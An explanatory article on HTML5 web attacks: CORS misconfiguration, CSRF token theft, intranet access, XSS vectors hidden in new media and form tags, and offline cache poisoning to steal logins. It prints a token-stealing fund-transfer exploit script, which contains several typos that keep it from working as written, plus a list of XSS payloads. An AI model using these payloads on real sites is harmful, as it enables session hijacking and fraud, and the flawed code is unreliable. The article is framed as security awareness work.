HTML5 Attacks – Common/Uncommon Attack Vectors
----------------------------------------------

HTML5 has been already known for several years. It is one of the key technologies in the Internet. Most websites, transmitting video, slowly give up Adobe Flash technology and switch to HTML5. The fact is that HTML5 is still being developed, and yet it is already used by most websites, mobile applications and IoT. 

All the latest versions of browsers already offer full support for HTML5, and thus created all the time new improvements to the language itself. All these functions are designed in such a way as to facilitate the handling of multimedia and graphical content without having to use any third-party plug-ins or API. The purpose of this article is to introduce to the few attacks on HTML5 and demonstrate how a hacker can quickly take control of your browser.

CORS (Cross Origin Resource Sharing) Attacks
----------------------------------------------

HTML5 must meet the growing needs of developers who want to create high-quality site. At the same time HTML5 has to get rid of some restrictions which were introduced earlier by SOP (Same Origin Policy). Same Origin Policy allowed scripts that come from one place to communicate with each other and benefit from their common methods, but made it impossible to access scripts from different locations. 

Now, to meet all the demands of developers, HTML5 has to break all the restrictions. For example, now Ajax requests can come from different domains and be carried out in various domains. SOP had a limit, consisting in the fact that both the website and scripts on the executed had come from the same domain. Now, without the SOP, a malicious Web page can load any information from any domain using the credentials of the victim and sending this data between multiple domains.

What does it mean? So long as the Website, let's call it Website A, can exchange data with another website, Website B, Website B can read all the data from the site Website A. This was possible by creating an exploit, using HTTP tunnel and a simple tool called Shell of the Future. The tool is based on the simple principle that if a party has an XSS vulnerability and JavaScript code can be executed, than innocent user can by clicking on infected link perform so called Cross Origin Requests. If the tool is used in the correct manner, the attacker can view the sessions of its victims and direct requests to the server, pretending to be the victim. Shell of the Future is a subject for a different article and will not be discussed here.

The fact is that you can takeover a session of any user using XSS vulnerability. This is possible only thanks to the COR support of HTML5 and it allows some tunneled connections. 


But my site is secure, I am using CSRF tokens …
----------------------------------------------

HTML5 allows to steal CSRF tokens. For example, if the token goes in the URL, or the GET request, you can safely steal CSRF tokens, and this is consistent with the definition of CORS. An attacker could freely use CSRF token and the user will not even notice. To carry out this attack, attribute "withCredentials" has to be set to true and Access-Control-Allow-Origin to '*'. Let's see how it can be used.

Suppose that your website has CSRF protection, and the token is sent GET request. Now the attacker sends a link to the user together with a valid CSRF token and a link to controlled site. The attacker can now be mediated by the Ajax request in the communication between a bank customer and the bank. Below exploit code that could be used


[exp1.html](exp1.html)

    <script>
    function exploit()
    {
      var xmlhttp;
      if(window.XMLHttpRequest)
      {
        xmlhttp=new XMLHttpRequest();
      }
      else
      {
      xlmlhttp=new ActiveXObject(“Microsof.XMLHTTP”);
      }
    
    xmlhttp.open(“GET”,”http://localhost/myBank/transfer.hmlt”,false);
    xmlhttp.send();
    if(xmlhttp.status=200)
    {
      var str=xmlhttp.responseText;
      var n=str.search(“csrfToken”);
      var final=str.substring(n+18,n+28);
      var url = “http://loclhost/myBank/TransferFund.html?datum1%2F=06-06-2013&amp;Account=1234&amo;csrfToken=” + escape(final);
      xmlhttp.open(“GET”, url, true);
      xmlhttp.send();
    }
    
    }
    </script>
    </head>
    <body onload=”exploit();”>
    </body>


Getting inside Intranet
-----------------------

Many companies have internal sites, which are used for employees. They are usually Intranet applications and are not available on the Web. Because it is a lot of them and they are used by employees in their daily work, they must work together. Unfortunately, most developers sets the header Access-Control-Allow-Origin: * and allows to carry out the CORS attack. It can be really well used by the attacker, who probably will use social engineering and compel employees to click on a suspicious link, and then in a very easy way to attack the internal enterprise applications. Here is an example of such an attack.

1. The internal corporate employee logs on to the intranet.
2. The server returns a response containing the Access-Control-Allow-Origin: * because it communicates well with other applications in the company.
3. The employee receives an e-mail that contains a link to the page with great graphics SVG. Each of these images contain hidden JavaScript code that will run when it is displayed. This is discussed in a separate article.
4. Code JavaScript XMLHttpRequest send silently in the background and waits for a response. This can be done because the appropriate headers are set to be (X-XSS-Protection: 1; Access-Control-Allow-Origin: *).
5. JavaScript analyzes the answers and sends back to the attacker's servers. Virus checking and other control measures have been omitted.
6. We are in the company and act as an employee, and no one will know what happened.

The new vectors of attack XSS in HTML5
-----------------------

Developers in every company will develop their own filters to block XSS attacks on websites. Most of these models on a few simple examples of OWASP. However, HTML5 introduced a tremendous amount of tags to enable support for audio and video. Below are some possible attack vectors that are used virtually every day.

[exp2.html](exp2.html)


    <video> <source onerror=”javascript:alert(1)”>
    <vide onerror=”javascript:alert(1)”><source>
    <audio onerror=”javascript:alert(1)”><source>
    <input autofocus onfocus=alert(1)>
    <select autofocus onfocus=alert(1)>
    <textarea autofocus onfocus=alert(1)>
    <keygen autofocus onfocus=alert(1)>
    <button form=test onformchange=alert(2)>X
    <form><button formaction=”javascript:alert(1)”>

Darknet Technique: Offline Web Application Cache Poisoning
----------------------------------------------------------

There is a certain functionality of most web browsers, called an offline cache processing. The functionality has been implemented by most browsers. The functionality is based on the fact that the application can process the contents of the page, even when you use it offline. The main problem of this feature is that an attack "cache poisoning" can be performed using this feature. If an attacker manages to replace at least one file of the site, it has full control over the user account. This can be done eg. using SVG file. You know what is the difference between HTML4 and HTML5? HTML5 essentially does not allow to cache all the files, but it allows you to cache specific files. Using this function, the attacker can steal login details belonging to any user. The following is a sample scenario of attack.

1. The user connects to an unsecured WiFi network at the mall and browse to a page, for example Facebook.
2. A hacker responds to this request by displaying the iframe Facebook login page, the user's browser automatically sends a request to the Facebook page. Login page to Facebook can be replaced by any application, including banking application.
3. Because the network is controlled by a hacker, the user will see a normal login page, but inside will be located additional JavaScript code. In addition, the page contains the appropriate tags, which require her to cache the user's system, so the page is already cached in the browser cache.
4. The sacrifice of a few hours, days, etc etc, it connects to the selected web page, in this case Facebook, but Facebook login page was buffered in a user's system. A page exactly substituted by hackers was buffered in a user's system.
5. The sacrifice is part of the link, and the browser loads a fake site from the cache.
6. The victim introduces credentials that are transported to the attacker. By the way, an attacker can mediate communication between Facebook and the innocent victim.

So through cache poisoning, the attacker can steal user's credentials. 


Summary
-------

Most of these tricks usually are not used or tested against, making it easier for Cybercriminals.

Please make sure you test your website and web application for these problems.


References:

http://resources.infosecinstitute.com/demystifying-html-5-attacks/


http://silenceonthewire.pl/index.php/ataki-na-html5-wprowadzenie/



